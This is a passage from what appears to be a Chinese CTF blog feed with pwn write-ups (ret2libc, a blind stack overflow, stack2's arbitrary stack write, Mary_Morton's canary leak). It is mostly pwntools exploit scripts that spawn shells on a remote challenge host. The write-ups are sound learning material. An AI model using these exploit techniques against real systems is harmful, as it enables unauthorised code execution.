punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main_addr<span class="token operator">=</span><span class="token number">0x04006B8</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>put_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>put_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token comment">#这里只能是返回到puts的plt表</span>payload<span class="token operator">+=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#因为got中存的是在libc的实际地址，而plt表存的是一段指令，我们要的是一段可执行的指令</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bye~\n'</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#这里这个x00不能换成a，这是为了补全高字节的</span>libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>    <span class="token comment">#dump是偏移量</span>libc_base<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>payload2<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload2<span class="token operator">+=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得shell：<br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/7.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打卡：盲打题:warm_up</title>
      <link href="/2023/01/05/%E6%89%93%E5%8D%A1%EF%BC%9A%E7%9B%B2%E6%89%93%E9%A2%98-warm-up/"/>
      <url>/2023/01/05/%E6%89%93%E5%8D%A1%EF%BC%9A%E7%9B%B2%E6%89%93%E9%A2%98-warm-up/</url>
      
        <content type="html"><![CDATA[<h2 id="盲打题warm-up"><a href="#盲打题warm-up" class="headerlink" title="盲打题warm_up"></a>盲打题warm_up</h2><p>碰到这题的时候以为是题目忘记给附件了，竟然没有题目……后来搜了一下我才知道：我在做一种很新的题目……<br><img src="/images/warm-up/1.png"><br>在碰到这个没附件的题目的时候，就可以做好打盲打的准备了，<strong>很显然第一次碰到，一脸懵逼，故打卡记录</strong><br><img src="/images/warm-up/2.png"><br>看了一下确实是什么反应都没有，输入%p没有任何回应，显然不是格式化字符串漏洞，这时考虑栈溢出。（都盲打了，什么也不知道不至于用什么保护机制来坑人吧）<br>给的0x40060d肯定是返回地址<br>学习下别人写的exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sys <span class="token operator">=</span> <span class="token number">0x40060d</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>　　io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">52590</span><span class="token punctuation">)</span>　　payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span>i <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>　　<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>　　io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>或<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sys <span class="token operator">=</span> <span class="token number">0x40060d</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>　　io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">52590</span><span class="token punctuation">)</span>　　payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span>i <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>　　<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>　　io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>　　io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两种代码那去试看看是32位还是64位</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stack2</title>
      <link href="/2023/01/05/stack2/"/>
      <url>/2023/01/05/stack2/</url>
      
        <content type="html"><![CDATA[<h2 id="stack2-wp"><a href="#stack2-wp" class="headerlink" title="stack2 wp"></a>stack2 wp</h2><p>写这篇博客想要稍微弥补一下我动态调试的不足，这题stack2是pwn题的进阶题也算有些难度了吧（大概吧，我没做出来，大佬勿笑……）<br>于是想要和这篇博客再重新做一遍理清一下思路。<br>checksec一下：<br><img src="/images/stack2/1.png"><br>开了canary保护、NX保护和部分RELRO保护按经验不是栈溢出题。<br>IDA分析：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-90h] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-8Ch] BYREF</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-88h] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-84h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-80h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+2Ch] [ebp-7Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [esp+30h] [ebp-78h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l<span class="token punctuation">;</span> <span class="token comment">// [esp+34h] [ebp-74h]</span>  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+38h] [ebp-70h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// [esp+9Ch] [ebp-Ch]</span>  v14 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*                      An easy calc                       *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*Give me your numbers and I will return to you an average *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*(0 &lt;= x &lt; 256)                                           *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many numbers you have:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your numbers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5 <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    v13<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> v5<span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"average is %.2lf\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token punctuation">)</span>v9 <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">&lt;=</span> <span class="token number">99</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            v3 <span class="token operator">=</span> j<span class="token operator">++</span><span class="token punctuation">;</span>            v13<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"id\t\tnumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\t\t%d\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> v13<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>      v9 <span class="token operator">+=</span> v13<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一张图截不下用代码段算了……这题比较失败的地方就是连漏洞都找错了<br>我开始想将v5赋值成100，然后再第100个数让他足够大把下面溢出覆盖掉，想到有canary压根没法知道，而且数字过于庞大也不好算<del>（太年轻了）</del>大佬笑笑就好<br>没有注意到下面那个替换数字的代码段可以实现栈上（v13以下）任意位置的改写，这样就可以直接改写返回地址，又可以绕过canary的检查，然后想想编程老师上课就有一题这样的例子，我更想撞墙了。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看网上的大佬wp说IDA给的返回地址到v13[0]的地址并不是真实的，因为编译器做了些手脚，在真正编译的时候会有变化（没有尝试没有动态调试的做法）要用动态调试的才是真的<br>老实说本人挺害怕动态调试的，希望能尽快熟悉掌握……<br>在IDA中进行反汇编，查看__isoc99_scanf（）调用的时候<br><img src="/images/stack2/2.png"><br>有个lea    edx, [ebp+var_70],lea指令可以把偏移地址存到dx，相当于C语言中的&amp;符号，而var_70就是ebp与v13的偏移量相当于把v13[0]的地址给了edx<br>于是在动态调试中先在 call    __isoc99_scanf（）处下个断点 r一下：<br><img src="/images/stack2/3.png"><br>单步执行n一直到mov  eax, [ebp+var_7C]：<br><img src="/images/stack2/4.png"><br>此时查看edx中保存的就是v13[0]的地址为0xffffd438，这个地址每次运行都不会一样，大家自己动手调试。<br>虽然IDA里的返回地址不准确但是执行ret指令时，肯定esp指针肯定保存的是返回地址于是在ret指令下个断点 r一下：<br><img src="/images/stack2/5.png"><br>发现esp指针里的值是0xffffd4bc，0xffffd4bc-0xffffd438&#x3D;0x84（十六进制）<br>而IDA里的是0x74显然二者不等。这里还有一个小坑如果这题是在本地打的就可以直接打通了，但如果是远程的话会提示没有bash这里大家可能回去找&#x2F;bin&#x2F;sh字符串去填充替代<br>找当然也可以找到（用我下面说找sh的方法），但是网上说这里的&#x2F;bin&#x2F;sh好像是只读的不可执行，其实用sh也可以打通shell我们在pwndbg中这样找：<br><img src="/images/stack2/6.png"><br>就可以找到很多，这里我选择用第一个（其他没试过不知道行不行，鼓励尝试）<br>记录下call system的地址：<br><img src="/images/stack2/7.png"><br>上exp:（这个exp也是借鉴网上大佬的，用构造函数的写法确实很方便，学到很多）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">56314</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many numbers you have:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Give me your numbers\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token comment">#addr_call_system = [0xB4,0x85,0x04,0x08]  小端序存储</span><span class="token comment">#addr_sh = [0x87,0x89,0x04,0x08]</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"5. exit\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"which number to change:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"new number:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0xb4</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x86</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">)</span>    <span class="token comment">#因为32位系统是用栈传递参数的所以，</span>change<span class="token punctuation">(</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">)</span>    <span class="token comment">#将sh的地址直接接在call system下面</span>change<span class="token punctuation">(</span><span class="token number">0x8a</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">)</span>    <span class="token comment">#执行call system会直接将其地址的内的内容当做参数</span>change<span class="token punctuation">(</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">)</span>    <span class="token comment">#如果是64位系统的话要在call system前</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>     <span class="token comment">#先准备一个pop rdi；ret的garget将sh的地址先弄进rdi就行</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得shell：<br><img src="/images/stack2/8.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mary_Morton</title>
      <link href="/2023/01/04/Mary-Morton/"/>
      <url>/2023/01/04/Mary-Morton/</url>
      
        <content type="html"><![CDATA[<h2 id="Mary-Morton-wp"><a href="#Mary-Morton-wp" class="headerlink" title="Mary_Morton wp"></a>Mary_Morton wp</h2><p>这篇博客主要讲一个方法：利用格式化字符串漏洞泄露canary内容</p><h3 id="格式化字符串漏洞泄露canary"><a href="#格式化字符串漏洞泄露canary" class="headerlink" title="格式化字符串漏洞泄露canary"></a>格式化字符串漏洞泄露canary</h3><p>先checksec一下：<br><img src="/images/Mary-Morton/1.png"><br>开了NX保护和Canary保护，本来一般开了Canary应该不是栈溢出的问题，但这题比较特殊有利用方法。<br>拖进IDA查看：<br><img src="/images/Mary-Morton/2.png"><br>有些名字我改过了<br>这里有两个漏洞可利用：一个是格式化字符串漏洞（format_string_bug），另一个是栈溢出（overflow_string_bug）<br>点进format_string_bug：<br><img src="/images/Mary-Morton/3.png"><br>在虚拟机中运行发现偏移量为6<br><img src="/images/Mary-Morton/4.png"><br>0x90-0x8&#x3D;0x88，0x88&#x2F;8&#x3D;17，17+6&#x3D;23<br>得Canary为printf的第23个参数，而后在溢出的必要位置加入Canary就行<br>overflow_string_bug：<br><img src="/images/Mary-Morton/5.png"><br>后门函数：<br><img src="/images/Mary-Morton/6.png"><br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">54809</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"3. Exit the battle \n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%23$p'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>c_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"3. Exit the battle \n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token 